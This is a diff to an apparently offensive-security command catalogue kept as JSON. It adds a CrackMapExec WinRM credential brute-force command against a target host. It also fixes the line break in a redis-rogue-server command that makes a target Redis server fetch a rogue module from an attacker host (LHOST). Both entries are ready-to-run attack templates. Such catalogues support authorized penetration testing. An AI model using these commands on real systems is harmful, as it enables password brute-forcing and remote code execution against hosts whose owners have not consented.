@@ -151,6 +151,11 @@
       "os": "Linux",
       "cmd": "nxc winrm {RHOST} -u users.txt -p pass.txt --local-auth --continue-on-success",
       "description": "Perform WinRM local credential brute-force/enumeration using NetExec against a target host, reading credentials from 'users.txt' and 'pass.txt' and continuing on success."
+    },
+    {
+      "os": "Linux",
+      "cmd": "crackmapexec winrm {RHOST} -u users.txt -p pass.txt --continue-on-success",
+      "description": "Perform WinRM local credential brute-force/enumeration using CrackMapExec against a target host, reading credentials from 'users.txt' and 'pass.txt' and continuing on success."
     }
   ],
   "miscellaneous_system_control": [
@@ -166,8 +171,7 @@
     },
     {
       "os": "Linux",
-      "cmd": "python3 redis-rogue-server.py --rhost {RHOST} --rport 6379 --lhost
-{LHOST} --lport 6379",
+      "cmd": "python3 redis-rogue-server.py --rhost {RHOST} --rport 6379 --lhost {LHOST} --lport 6379",
       "description": "redis rougue server"
     },
     {
